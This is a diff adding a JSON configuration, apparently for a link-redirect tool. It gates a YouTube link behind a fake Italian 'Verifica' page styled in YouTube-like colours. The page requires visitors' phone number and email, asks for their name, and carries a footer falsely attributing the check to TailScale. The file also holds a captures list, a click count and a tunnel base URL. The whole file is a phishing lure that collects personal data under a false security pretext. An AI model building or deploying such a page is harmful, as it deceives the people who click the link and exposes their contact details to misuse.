@@ -1,0 +1,58 @@
+{
+  "links": {
+    "verify": {
+      "url": "https://www.youtube.com",
+      "mode": "strict",
+      "note": "",
+      "page": {
+        "tab_title": "Verifica",
+        "title": "Verifica",
+        "subtitle": "Compila i campi richiesti per proseguire alla destinazione.",
+        "button": "Continua",
+        "footer": "Servizio di sicurezza fornito da TailScale",
+        "logo_emoji": "",
+        "logo_url": "",
+        "accent": "#c4302b",
+        "bg": "#0f0f0f",
+        "text": "#f2f0f7",
+        "card": "#151419",
+        "radius": "12px",
+        "css": "",
+        "lang": "it"
+      },
+      "fields": [
+        {
+          "name": "telefono",
+          "type": "tel",
+          "label": "Numero di telefono",
+          "placeholder": "+39 333 0000000",
+          "options": "",
+          "required": true
+        },
+        {
+          "name": "email",
+          "type": "email",
+          "label": "Indirizzo email",
+          "placeholder": "nome@esempio.com",
+          "options": "",
+          "required": true
+        },
+        {
+          "name": "nome",
+          "type": "text",
+          "label": "Nome",
+          "placeholder": "Il tuo nome",
+          "options": "",
+          "required": false
+        }
+      ],
+      "delay_ms": 350,
+      "creato": "17/11/2026 00:50:50",
+      "clicks": 5
+    }
+  },
+  "captures": [],
+  "settings": {
+    "base_url": "https://msi.taild1ec7e.ts.net"
+  }
+}
